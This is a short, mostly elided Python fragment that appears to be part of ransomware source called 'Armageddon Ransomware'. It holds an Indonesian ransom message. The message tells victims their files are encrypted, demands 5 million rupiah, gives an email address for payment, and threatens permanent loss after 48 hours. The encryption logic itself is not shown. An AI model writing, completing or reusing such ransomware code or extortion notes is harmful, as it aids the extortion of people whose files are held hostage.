    ...
    if encrypt: 
        ...
        def connector():
            ...
            try:
                ...
                # if plt == "Windows"
                ransom_message = "Semua file Anda telah dienkripsi oleh Armageddon Ransomware.\n\n" \
                                 "Untuk mendapatkan kunci dekripsi, Anda harus membayar tebusan sebesar 5 juta rupiah.\n\n" \
                                 "Kirim email pembayaran ke: retaabi58@gmail.com\n\n" \
                                 "Jangan coba-coba untuk mendekripsi sendiri, karena itu tidak akan berhasil.\n\n" \
                                 "Anda memiliki waktu 48 jam untuk melakukan pembayaran, jika tidak, file Anda akan hilang selamanya."
